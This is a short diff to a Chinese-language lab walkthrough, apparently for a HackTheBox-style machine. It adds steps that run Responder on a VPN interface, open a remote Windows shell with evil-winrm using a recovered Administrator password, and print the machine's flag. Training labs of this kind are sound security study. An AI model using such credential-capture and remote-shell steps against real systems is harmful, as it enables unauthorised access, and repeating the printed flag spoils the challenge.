@@ -212,8 +212,19 @@ sudo apt install responder
 
 # 监听网卡
 sudo responder -I tun0
+```
+
+![image-20241129123145894](./assets/image-20241129123145894.png)
+
+```shell
+# 直接使用evil-winrm连接
+sudo apt install evil-winrm
+evil-winrm  -i 10.129.196.56 -u Administrator -p badminton
+
+# make用户Desktop下flag.txt
+cat flag.txt
+ea81b7afddd03efaa0945333ed147fac
 
 ```
 
-
-
+> Evil-WinRM 是一个 WinRM（Windows Remote Management）shell。 [github](https://github.com/Hackplayers/evil-winrm)
